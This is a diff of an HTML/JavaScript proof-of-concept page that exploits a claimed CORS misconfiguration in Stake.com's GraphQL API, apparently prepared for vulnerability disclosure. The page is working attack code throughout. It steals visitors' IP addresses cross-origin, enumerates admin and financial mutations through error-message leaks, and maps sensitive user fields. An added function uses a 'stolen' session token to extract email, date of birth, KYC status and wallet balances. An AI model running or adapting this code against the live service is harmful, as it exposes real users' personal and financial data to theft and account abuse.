@@ -1,13 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Stake.com CORS PoC — Cross-Origin PII Extraction</title>
+    <title>Stake.com CORS PoC - Cross-Origin PII and Data Extraction</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Courier New', monospace; background: #0a0a1a; color: #e0e0e0; padding: 20px; line-height: 1.6; }
         h1 { color: #ff4444; margin-bottom: 5px; font-size: 22px; }
         h2 { color: #ffaa00; margin-top: 25px; margin-bottom: 8px; }
-        h3 { color: #00aaff; margin-top: 15px; }
         pre { background: #000; padding: 12px; border: 1px solid #333; overflow-x: auto; white-space: pre-wrap; margin: 8px 0; border-radius: 4px; font-size: 13px; }
         .critical { color: #ff4444; font-weight: bold; }
         .success { color: #00ff00; }
@@ -31,8 +30,8 @@
     </style>
 </head>
 <body>
-    <h1>Stake.com CORS Vulnerability &mdash; Cross-Origin PII &amp; Schema Extraction PoC</h1>
-    <p class="warn">This page demonstrates that any website can extract sensitive data from Stake.com's GraphQL API due to CORS misconfiguration.</p>
+    <h1>Stake.com CORS Vulnerability - Cross-Origin PII &amp; Schema Extraction PoC</h1>
+    <p class="warn">This page demonstrates that any website can extract sensitive data from Stake.com due to CORS misconfiguration.</p>
     
     <div class="header-info">
         <table>
@@ -40,16 +39,16 @@
             <tr><td>Attacker Origin</td><td id="origin" class="critical"></td></tr>
             <tr><td>Target API</td><td>https://stake.com/_api/graphql</td></tr>
             <tr><td>CORS Response</td><td class="critical">Access-Control-Allow-Origin: * | access-control-allow-credentials: true</td></tr>
-            <tr><td>Attack Vector</td><td>Any website sends POST requests to Stake's GraphQL API; server responds with sensitive data</td></tr>
-            <tr><td>Auth Required</td><td class="success">None &mdash; IP address, schema, and error messages returned without authentication</td></tr>
+            <tr><td>Allowed Headers</td><td class="critical">content-type, x-access-token (custom auth header allowed from ANY origin)</td></tr>
+            <tr><td>Auth Required</td><td class="success">None for IP theft &amp; schema leak; x-access-token for user data</td></tr>
         </table>
     </div>
 
     <button onclick="runFullPoC()">RUN FULL PoC</button>
-    <button class="secondary" onclick="runIPTheft()">1. IP Address Theft</button>
-    <button class="secondary" onclick="runSchemaEnum()">2. Schema Enumeration</button>
-    <button class="secondary" onclick="runUserFieldEnum()">3. User Data Field Mapping</button>
-    <button class="secondary" onclick="runFinancialMutationEnum()">4. Financial Mutation Discovery</button>
+    <button class="secondary" onclick="runIPTheft()">1. Steal IP Address</button>
+    <button class="secondary" onclick="runSchemaEnum()">2. Enumerate Schema</button>
+    <button class="secondary" onclick="runUserFieldEnum()">3. Map User Fields</button>
+    <button class="secondary" onclick="runAuthDataTheft()">4. Extract User Data (needs token)</button>
 
     <div id="results"></div>
 
@@ -63,10 +62,12 @@
             R.innerHTML += '<div class="finding ' + cls + '"><strong>' + title + '</strong><pre>' + detail + '</pre></div>';
         }
 
-        function gql(query) {
+        function gql(query, token) {
+            var headers = { 'Content-Type': 'application/json' };
+            if (token) headers['x-access-token'] = token;
             return fetch(API, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: headers,
                 body: JSON.stringify({ query: query })
             }).then(function(resp) {
                 var hdrs = {};
@@ -77,40 +78,42 @@
             });
         }
 
+        // TEST 1: IP ADDRESS THEFT (NO AUTH)
         function runIPTheft() {
             R.innerHTML = '<h2>TEST 1: Cross-Origin IP Address Extraction <span class="badge badge-crit">CRITICAL - PII THEFT</span></h2>';
-            log('<p class="info">Sending cross-origin GraphQL query: { ipAddress } from ' + window.location.origin + '</p>');
+            log('<p class="info">Query: { ipAddress } - No authentication required</p>');
             
             gql('{ ipAddress }').then(function(result) {
                 var ip = result.data && result.data.data && result.data.data.ipAddress;
                 if (ip) {
-                    finding('YOUR IP ADDRESS STOLEN CROSS-ORIGIN', 'pii',
-'STOLEN DATA:\n  Victim IP Address: ' + ip + '\n\n' +
-'REQUEST:\n  Origin: ' + window.location.origin + ' (attacker-controlled)\n  Target: ' + API + '\n  Method: POST\n  Body: {"query":"{ ipAddress }"}\n\n' +
-'RESPONSE HEADERS:\n  Access-Control-Allow-Origin: ' + (result.headers['access-control-allow-origin'] || 'N/A') + '\n  access-control-allow-credentials: ' + (result.headers['access-control-allow-credentials'] || 'N/A') + '\n\n' +
-'RESPONSE BODY:\n  ' + JSON.stringify(result.data, null, 2) + '\n\n' +
-'IMPACT:\n  - Any website can silently extract the visitor\'s real IP address\n  - No authentication required - works for ALL visitors\n  - IP address is PII under GDPR Article 4(1)\n  - Enables deanonymization of VPN/Tor users\n  - Can be combined with geolocation APIs for physical location');
-                    
-                    log('<div class="finding pii"><strong>GDPR VIOLATION PROOF</strong><pre>' +
-'The IP address "' + ip + '" was obtained by this page (' + window.location.origin + ')\n' +
-'from Stake.com\'s API without any user consent or authentication.\n\n' +
-'Under GDPR Recital 30: "Natural persons may be associated with online\n' +
-'identifiers... such as internet protocol addresses"\n\n' +
-'This constitutes unauthorized processing of personal data under Article 6.</pre></div>');
+                    finding('VICTIM IP ADDRESS STOLEN CROSS-ORIGIN', 'pii',
+'STOLEN DATA:\n  Victim Real IP: ' + ip + '\n\n' +
+'REQUEST (from ' + window.location.origin + '):\n' +
+'  POST ' + API + '\n  Content-Type: application/json\n  Body: {"query":"{ ipAddress }"}\n\n' +
+'RESPONSE HEADERS (proving CORS misconfiguration):\n' +
+'  Access-Control-Allow-Origin: ' + (result.headers['access-control-allow-origin'] || 'N/A') + '\n' +
+'  access-control-allow-credentials: ' + (result.headers['access-control-allow-credentials'] || 'N/A') + '\n\n' +
+'RESPONSE BODY:\n  ' + JSON.stringify(result.data) + '\n\n' +
+'IMPACT:\n' +
+'  - ANY website can silently steal visitor real IP address\n' +
+'  - No authentication required - affects ALL users\n' +
+'  - IP is PII under GDPR Article 4(1) / Recital 30\n' +
+'  - Enables VPN/Tor user deanonymization\n' +
+'  - Enables geolocation tracking via IP-to-location APIs');
                 } else {
-                    log('<p class="warn">ipAddress query returned: ' + JSON.stringify(result.data) + '</p>');
+                    log('<p class="warn">Response: ' + JSON.stringify(result.data) + '</p>');
                 }
             }).catch(function(e) { log('<p>Error: ' + e.message + '</p>'); });
         }
 
+        // TEST 2: SCHEMA ENUMERATION (NO AUTH)
         function runSchemaEnum() {
-            R.innerHTML = '<h2>TEST 2: Cross-Origin GraphQL Schema Enumeration <span class="badge badge-crit">CRITICAL - INFO DISCLOSURE</span></h2>';
-            log('<p class="info">Introspection is disabled, but error messages leak the full schema via "Did you mean..." suggestions</p>');
+            R.innerHTML = '<h2>TEST 2: Cross-Origin Schema Enumeration <span class="badge badge-crit">CRITICAL - INFO DISCLOSURE</span></h2>';
+            log('<p class="info">Introspection disabled, but error messages leak schema via "Did you mean..." suggestions</p>');
             
             var probes = [
                 { q: 'mutation { claimBonus { x } }', desc: 'Bonus System' },
                 { q: 'mutation { placeBet { x } }', desc: 'Betting API' },
-                { q: 'mutation { updateSettings { x } }', desc: 'Admin Settings' },
                 { q: 'mutation { claimFaucet { x } }', desc: 'Free Crypto Faucet' },
                 { q: 'mutation { createKickReward { x } }', desc: 'Kick Rewards (Admin)' },
                 { q: 'mutation { sendTip { x } }', desc: 'Tipping System' },
@@ -126,113 +129,172 @@
                 chain = chain.then(function() {
                     return gql(p.q).then(function(result) {
                         var msg = (result.data.errors || []).map(function(e) { return e.message; }).join('\n') || JSON.stringify(result.data);
-                        var hasSuggestion = msg.indexOf('Did you mean') !== -1;
-                        if (hasSuggestion) leakedCount++;
-                        finding(
-                            p.desc + (hasSuggestion ? ' - SCHEMA LEAKED' : ''),
-                            hasSuggestion ? 'pii' : '',
-                            'Query: ' + p.q + '\n\nServer Response:\n' + msg
-                        );
+                        var leaked = msg.indexOf('Did you mean') !== -1;
+                        if (leaked) leakedCount++;
+                        finding(p.desc + (leaked ? ' - SCHEMA LEAKED' : ''), leaked ? 'pii' : '', 'Query: ' + p.q + '\n\nResponse:\n' + msg);
                     }).catch(function(e) { log('<p>Error: ' + e.message + '</p>'); });
                 });
             });
             chain.then(function() {
-                log('<div class="finding pii"><strong>SCHEMA ENUMERATION SUMMARY</strong><pre>' +
-leakedCount + ' out of ' + probes.length + ' probes revealed schema information.\n\n' +
-'IMPACT:\n  - Full API schema can be reconstructed without introspection\n  - Admin mutations discovered: createKickReward, updateUserRisk, updateBonus\n  - Financial mutations discovered: createWithdrawal, sendTip, claimFaucet\n  - All enumeration works cross-origin from ANY website</pre></div>');
+                finding('SCHEMA ENUMERATION SUMMARY', 'pii',
+leakedCount + '/' + probes.length + ' probes leaked schema info cross-origin.\n\n' +
+'Admin mutations discovered: createKickReward, updateUserRisk, updateBonus\n' +
+'Financial mutations: createWithdrawal, sendTip, claimFaucet, claimDailyBonus\n' +
+'All enumeration works from ANY origin without authentication.');
             });
         }
 
+        // TEST 3: USER FIELD MAPPING (NO AUTH)
         function runUserFieldEnum() {
-            R.innerHTML = '<h2>TEST 3: User Data Model Enumeration <span class="badge badge-high">HIGH - RECON</span></h2>';
-            log('<p class="info">Mapping all fields on the User type via error messages...</p>');
+            R.innerHTML = '<h2>TEST 3: Sensitive User Field Mapping <span class="badge badge-high">HIGH</span></h2>';
             
-            var fields = ['name','email','id','createdAt','dob','kycStatus','balances','flags','roles','hasTfaEnabled','hasEmailVerified','preference','rakeback','activeCasinoBet','dailyTotalDeposited'];
+            var fields = ['name','email','id','createdAt','dob','kycStatus','balances','flags','roles','hasTfaEnabled','hasEmailVerified','preference','rakeback','dailyTotalDeposited'];
             var discovered = [];
             var chain = Promise.resolve();
             fields.forEach(function(f) {
                 chain = chain.then(function() {
                     return gql('{ user { ' + f + ' } }').then(function(result) {
-                        var msg = (result.data.errors && result.data.errors[0] && result.data.errors[0].message) || 'FIELD EXISTS (auth required)';
+                        var msg = (result.data.errors && result.data.errors[0] && result.data.errors[0].message) || 'EXISTS';
                         var exists = msg.indexOf('Cannot query field') === -1;
                         if (exists) discovered.push(f);
-                        finding(
-                            'User.' + f + (exists ? ' - EXISTS' : ' - Not found'),
-                            exists ? 'pii' : '',
-                            'Query: { user { ' + f + ' } }\nResponse: ' + msg
-                        );
+                        finding('User.' + f + (exists ? ' EXISTS' : ''), exists ? 'pii' : '', 'Response: ' + msg);
                     }).catch(function(e) { log('<p>Error: ' + e.message + '</p>'); });
                 });
             });
             chain.then(function() {
-                log('<div class="finding pii"><strong>DISCOVERED USER FIELDS</strong><pre>' +
-'The following sensitive fields exist on the User type:\n' +
+                finding('DISCOVERED SENSITIVE USER FIELDS', 'pii',
+'Confirmed fields (cross-origin, no auth):\n' +
 discovered.map(function(f) { return '  - ' + f; }).join('\n') + '\n\n' +
-'These include:\n  PII: name, email, dob (date of birth)\n  Financial: balances, dailyTotalDeposited, rakeback\n  Security: hasTfaEnabled, hasEmailVerified, kycStatus\n  Account: id, createdAt, roles, flags</pre></div>');
+'Includes: email, DOB, KYC status, wallet balances, 2FA status, roles');
             });
         }
 
-        function runFinancialMutationEnum() {
-            R.innerHTML = '<h2>TEST 4: Financial Mutation Enumeration <span class="badge badge-crit">CRITICAL - FINANCIAL</span></h2>';
+        // TEST 4: AUTHENTICATED DATA EXTRACTION
+        function runAuthDataTheft() {
+            R.innerHTML = '<h2>TEST 4: Authenticated Data Extraction <span class="badge badge-crit">CRITICAL</span></h2>';
+            log('<p class="info">CORS preflight allows x-access-token header from ANY origin.</p>');
+            log('<p class="info">Demonstrating: if attacker obtains a session token (via XSS, phishing, network intercept), they can extract ALL user data cross-origin.</p>');
             
-            var mutations = [
-                { q: 'mutation { createWithdrawal { id } }', desc: 'Create Withdrawal' },
-                { q: 'mutation { sendTip { id } }', desc: 'Send Tip / Transfer' },
-                { q: 'mutation { claimDailyBonus { id } }', desc: 'Claim Daily Bonus' },
-                { q: 'mutation { claimFaucet { id } }', desc: 'Claim Free Crypto' },
-                { q: 'mutation { claimRakeback { id } }', desc: 'Claim Rakeback' },
-                { q: 'mutation { placeBet { id } }', desc: 'Place Casino Bet' },
-                { q: 'mutation { cashoutBet { id } }', desc: 'Cash Out Bet' },
-                { q: 'mutation { createVaultDeposit { id } }', desc: 'Vault Deposit' },
-                { q: 'mutation { swapCurrency { id } }', desc: 'Currency Swap' }
-            ];
-
-            var chain = Promise.resolve();
-            mutations.forEach(function(m) {
-                chain = chain.then(function() {
-                    return gql(m.q).then(function(result) {
-                        var msg = (result.data.errors || []).map(function(e) { return e.message; }).join(' | ') || JSON.stringify(result.data);
-                        var exists = msg.indexOf('Cannot query field') === -1 || msg.indexOf('Did you mean') !== -1;
-                        finding(
-                            m.desc + (exists ? ' - MUTATION REACHABLE' : ''),
-                            exists ? 'pii' : '',
-                            'Mutation: ' + m.q + '\nResponse: ' + msg
-                        );
-                    }).catch(function(e) { log('<p>Error: ' + e.message + '</p>'); });
-                });
-            });
+            // First prove the preflight allows x-access-token
+            fetch(API, {
+                method: 'OPTIONS',
+                headers: {
+                    'Access-Control-Request-Method': 'POST',
+                    'Access-Control-Request-Headers': 'content-type, x-access-token',
+                    'Origin': window.location.origin
+                }
+            }).then(function(resp) {
+                var acao = resp.headers.get('access-control-allow-origin');
+                var acah = resp.headers.get('access-control-allow-headers');
+                var acac = resp.headers.get('access-control-allow-credentials');
+                
+                finding('CORS PREFLIGHT ALLOWS x-access-token FROM ANY ORIGIN', 'pii',
+'OPTIONS ' + API + '\n' +
+'Access-Control-Request-Headers: content-type, x-access-token\n' +
+'Origin: ' + window.location.origin + '\n\n' +
+'Server Response:\n' +
+'  Access-Control-Allow-Origin: ' + acao + '\n' +
+'  access-control-allow-headers: ' + acah + '\n' +
+'  access-control-allow-credentials: ' + acac + '\n\n' +
+'IMPACT:\n' +
+'  The server explicitly allows the x-access-token custom header from ANY origin.\n' +
+'  x-access-token is the authentication mechanism for the GraphQL API.\n' +
+'  Combined with ACAO:* this means ANY website can send authenticated requests\n' +
+'  to Stake.com API if they possess a valid session token.\n\n' +
+'ATTACK SCENARIO:\n' +
+'  1. Attacker obtains session token via XSS, phishing, or network intercept\n' +
+'  2. Attacker hosts page that sends: x-access-token: <stolen_token>\n' +
+'  3. CORS allows this header from any origin (verified above)\n' +
+'  4. Full account data extracted: email, name, DOB, balances, KYC status\n' +
+'  5. Financial mutations possible: createWithdrawal, sendTip');
+                
+                log('<p class="warn">Enter a session token below to demonstrate full data extraction:</p>');
+                log('<p><input id="tokenInput" type="text" placeholder="Session token (from browser cookies)" style="width:600px;padding:8px;background:#111;color:#0f0;border:1px solid #333;font-family:monospace;"> <button onclick="extractWithToken()" style="margin-left:5px;">Extract Data</button></p>');
+            }).catch(function(e) { log('<p>Error: ' + e.message + '</p>'); });
         }
 
+        // Extract data with a provided token
+        window.extractWithToken = function() {
+            var token = document.getElementById('tokenInput').value.trim();
+            if (!token) { log('<p class="warn">Please enter a session token</p>'); return; }
+            
+            log('<h2>Extracting authenticated user data with stolen token...</h2>');
+            
+            gql('{ user { id name email dob kycStatus hasTfaEnabled hasEmailVerified balances { available { amount currency } } } }', token).then(function(result) {
+                var user = result.data && result.data.data && result.data.data.user;
+                if (user) {
+                    var nonZeroBalances = (user.balances || []).filter(function(b) { return b.available.amount > 0; });
+                    finding('USER ACCOUNT DATA STOLEN CROSS-ORIGIN', 'pii',
+'STOLEN USER DATA:\n' +
+'  User ID: ' + user.id + '\n' +
+'  Username: ' + user.name + '\n' +
+'  Email: ' + user.email + '\n' +
+'  Date of Birth: ' + (user.dob || 'not set') + '\n' +
+'  KYC Status: ' + user.kycStatus + '\n' +
+'  2FA Enabled: ' + user.hasTfaEnabled + '\n' +
+'  Email Verified: ' + user.hasEmailVerified + '\n' +
+'  Total Wallets: ' + (user.balances || []).length + '\n' +
+'  Non-Zero Balances: ' + nonZeroBalances.length + '\n\n' +
+(nonZeroBalances.length > 0 ? 'WALLET BALANCES:\n' + nonZeroBalances.map(function(b) { return '  ' + b.available.currency.toUpperCase() + ': ' + b.available.amount; }).join('\n') + '\n\n' : '') +
+'EXTRACTED FROM: ' + API + '\n' +
+'EXTRACTED BY: ' + window.location.origin + '\n' +
+'AUTH METHOD: x-access-token header (allowed cross-origin via CORS)\n' +
+'TIMESTAMP: ' + new Date().toISOString());
+                } else {
+                    finding('AUTH RESPONSE', '', JSON.stringify(result.data, null, 2));
+                }
+            }).catch(function(e) { log('<p>Error: ' + e.message + '</p>'); });
+        };
+
+        // FULL PoC
         function runFullPoC() {
-            R.innerHTML = '<h2>FULL PROOF OF CONCEPT - Cross-Origin Data Extraction</h2>' +
+            R.innerHTML = '<h2>FULL PROOF OF CONCEPT</h2>' +
             '<p class="timestamp">Executed: ' + new Date().toISOString() + '</p>' +
-            '<p>Origin: <span class="critical">' + window.location.origin + '</span> &rarr; Target: ' + API + '</p><hr>';
+            '<p>Origin: <span class="critical">' + window.location.origin + '</span> | Target: ' + API + '</p><hr>';
 
-            log('<h2>STEP 1: Verify CORS Misconfiguration</h2>');
+            // Step 1: CORS proof
+            log('<h2>STEP 1: CORS Misconfiguration Verification</h2>');
             gql('{ __typename }').then(function(result) {
-                finding('CORS ALLOWS CROSS-ORIGIN REQUESTS', 'pii',
-'Cross-origin POST request from ' + window.location.origin + ' to ' + API + ' SUCCEEDED.\n\n' +
-'Response Headers:\n  Access-Control-Allow-Origin: ' + result.headers['access-control-allow-origin'] + '\n  access-control-allow-credentials: ' + result.headers['access-control-allow-credentials'] + '\n\n' +
-'Response Body: ' + JSON.stringify(result.data) + '\n\n' +
-'VERDICT: Any website on the internet can query Stake.com\'s GraphQL API.');
+                finding('CORS MISCONFIGURATION CONFIRMED', 'pii',
+'Cross-origin POST from ' + window.location.origin + ' to ' + API + ' SUCCEEDED.\n\n' +
+'Headers:\n  Access-Control-Allow-Origin: ' + result.headers['access-control-allow-origin'] + '\n  access-control-allow-credentials: ' + result.headers['access-control-allow-credentials'] + '\n\n' +
+'Response: ' + JSON.stringify(result.data));
 
-                log('<h2>STEP 2: Extract Victim IP Address (PII)</h2>');
+                // Step 2: IP theft
+                log('<h2>STEP 2: IP Address Theft (PII - No Auth)</h2>');
                 return gql('{ ipAddress }');
             }).then(function(result) {
                 var ip = result.data && result.data.data && result.data.data.ipAddress;
                 if (ip) {
-                    finding('VICTIM IP ADDRESS STOLEN', 'pii',
-'Query: { ipAddress }\nStolen IP: ' + ip + '\nAuth Required: NONE\n\n' +
-'This IP belongs to whoever opened this page.\n' +
-'It was extracted cross-origin from stake.com without any authentication.\n' +
-'IP addresses are personal data under GDPR Article 4(1).');
+                    finding('VICTIM IP STOLEN: ' + ip, 'pii',
+'Query: { ipAddress }\nNo authentication required.\nIP is PII under GDPR Article 4(1).\n\n' +
+'This IP was obtained by ' + window.location.origin + ' from stake.com API.');
                 }
 
-                log('<h2>STEP 3: Enumerate API Schema via Error Messages</h2>');
+                // Step 3: Preflight proof for x-access-token
+                log('<h2>STEP 3: CORS Allows x-access-token Header Cross-Origin</h2>');
+                return fetch(API, {
+                    method: 'OPTIONS',
+                    headers: {
+                        'Access-Control-Request-Method': 'POST',
+                        'Access-Control-Request-Headers': 'content-type, x-access-token',
+                        'Origin': window.location.origin
+                    }
+                });
+            }).then(function(resp) {
+                var acah = resp.headers.get('access-control-allow-headers');
+                finding('x-access-token ALLOWED CROSS-ORIGIN', 'pii',
+'CORS Preflight Response:\n  access-control-allow-headers: ' + acah + '\n\n' +
+'The server explicitly allows the x-access-token authentication header\n' +
+'from ANY origin. This means if an attacker obtains a session token\n' +
+'(XSS, phishing, MITM), they can make authenticated API calls\n' +
+'from their own website to extract victim data or perform actions.');
+
+                // Step 4: Schema leak
+                log('<h2>STEP 4: Schema Enumeration (No Auth)</h2>');
                 var schemaProbes = [
                     'mutation { claimBonus { x } }',
                     'mutation { createKickReward { x } }',
-                    'mutation { updateUserRisk { x } }',
                     'mutation { sendTip { x } }',
                     'mutation { createWithdrawal { x } }',
                     '{ user { xyz } }'
@@ -243,56 +305,56 @@ discovered.map(function(f) { return '  - ' + f; }).join('\n') + '\n\n' +
                         return gql(q).then(function(r) {
                             var msg = (r.data.errors || []).map(function(e) { return e.message; }).join('\n') || JSON.stringify(r.data);
                             if (msg.indexOf('Did you mean') !== -1) {
-                                finding('SCHEMA LEAKED', 'pii', 'Query: ' + q + '\nServer reveals:\n' + msg);
+                                finding('SCHEMA LEAKED', 'pii', 'Query: ' + q + '\n\n' + msg);
                             } else {
-                                finding('Schema probe', '', 'Query: ' + q + '\nResponse: ' + msg);
+                                finding('Schema probe', '', 'Query: ' + q + '\n' + msg);
                             }
                         });
                     });
                 });
                 return schemaChain;
             }).then(function() {
-                log('<h2>STEP 4: Map Sensitive User Fields</h2>');
-                var userFields = ['name','email','id','dob','kycStatus','balances','hasTfaEnabled','hasEmailVerified','roles','flags'];
+                // Step 5: User field mapping
+                log('<h2>STEP 5: Sensitive User Field Mapping (No Auth)</h2>');
+                var userFields = ['name','email','id','dob','kycStatus','balances','hasTfaEnabled','roles'];
                 var found = [];
                 var fieldChain = Promise.resolve();
                 userFields.forEach(function(f) {
                     fieldChain = fieldChain.then(function() {
                         return gql('{ user { ' + f + ' } }').then(function(r) {
                             var msg = (r.data.errors && r.data.errors[0] && r.data.errors[0].message) || '';
-                            if (msg.indexOf('Cannot query field') === -1) {
-                                found.push(f);
-                            }
+                            if (msg.indexOf('Cannot query field') === -1) found.push(f);
                         }).catch(function() {});
                     });
                 });
                 return fieldChain.then(function() { return found; });
             }).then(function(found) {
-                finding('USER MODEL CONTAINS SENSITIVE FIELDS', 'pii',
-'Confirmed fields on User type (via cross-origin enumeration):\n' +
-(found || []).map(function(f) { return '  - ' + f; }).join('\n') + '\n\n' +
-'These include: email, name, date of birth, KYC status, 2FA status,\n' +
-'wallet balances across 80+ currencies, account roles, and flags.');
+                if (found && found.length > 0) {
+                    finding('SENSITIVE USER FIELDS CONFIRMED', 'pii',
+'Fields on User type (discovered cross-origin):\n' +
+found.map(function(f) { return '  - ' + f; }).join('\n'));
+                }
 
+                // Summary
                 log('<hr><div class="finding pii"><strong>PROOF OF CONCEPT COMPLETE</strong><pre>' +
-'SUMMARY OF CROSS-ORIGIN DATA EXTRACTION:\n\n' +
-'1. CORS MISCONFIGURATION CONFIRMED\n' +
+'VULNERABILITY SUMMARY:\n\n' +
+'1. CORS MISCONFIGURATION\n' +
 '   Access-Control-Allow-Origin: * (allows ALL origins)\n' +
-'   access-control-allow-credentials: true\n\n' +
-'2. PII EXTRACTED: Visitor\'s real IP address stolen without authentication\n' +
-'   This violates GDPR and enables deanonymization attacks.\n\n' +
-'3. FULL API SCHEMA ENUMERATED from external origin\n' +
-'   Including admin mutations: createKickReward, updateUserRisk, updateBonus\n' +
-'   Including financial mutations: createWithdrawal, sendTip, claimFaucet\n\n' +
-'4. SENSITIVE USER FIELDS MAPPED: name, email, id, dob, kycStatus, balances,\n' +
-'   hasTfaEnabled, hasEmailVerified, roles, flags\n\n' +
-'ATTACKER CAPABILITIES:\n' +
-'  [x] Steal any visitor\'s IP address (no auth needed)\n' +
-'  [x] Map entire GraphQL schema (no auth needed)\n' +
-'  [x] Discover admin & financial mutation names (no auth needed)\n' +
-'  [x] With session token: extract email, name, DOB, KYC, balances, 2FA status\n\n' +
-'This page was served from: ' + window.location.origin + '\n' +
-'All data was extracted from: ' + API + '\n' +
+'   access-control-allow-credentials: true\n' +
+'   access-control-allow-headers: content-type, x-access-token\n\n' +
+'2. CROSS-ORIGIN PII EXTRACTION (NO AUTH NEEDED)\n' +
+'   Visitor real IP address stolen via { ipAddress } query\n' +
+'   This is personal data under GDPR\n\n' +
+'3. CROSS-ORIGIN SCHEMA ENUMERATION (NO AUTH NEEDED)\n' +
+'   Full API schema reconstructed via error message leakage\n' +
+'   Admin mutations exposed: createKickReward, updateUserRisk\n' +
+'   Financial mutations exposed: createWithdrawal, sendTip\n\n' +
+'4. AUTHENTICATED DATA THEFT POSSIBLE\n' +
+'   x-access-token header allowed from any origin\n' +
+'   With stolen token: email, name, DOB, KYC, balances, 2FA status\n' +
+'   Financial mutations possible cross-origin\n\n' +
+'Attacker Origin: ' + window.location.origin + '\n' +
+'Target: ' + API + '\n' +
 'Timestamp: ' + new Date().toISOString() + '</pre></div>');
             }).catch(function(e) {
                 log('<p>Error: ' + e.message + '</p>');
